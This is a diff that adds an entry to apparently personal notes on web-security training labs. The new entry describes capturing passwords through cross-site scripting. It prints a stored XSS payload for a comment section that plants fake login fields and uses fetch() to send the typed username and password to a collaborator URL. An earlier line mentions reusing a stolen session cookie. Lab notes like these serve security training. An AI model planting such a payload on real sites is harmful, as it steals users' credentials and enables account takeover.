@@ -33,3 +33,14 @@ TIP:-         Test every entry point.
      3. Enter the sessioncookie in current session and lab is solved.
 
 -----------------------------------------------------------------------------------------
+
+#5 Lab: Exploiting cross-site scripting to capture passwords
+
+     1. In comment section of any post enter the payload given below
+     <input name=username id=username>
+     <input type=password name=password onchange='if(this.value.length)
+     fetch('https://collaboratr-url?username="+username.value+"&password="+this.value)'>
+     2. See the response in collaborator and gather password from there
+     3. Enter the password in current session and lab is solved
+
+------------------------------------------------------------------------------------------
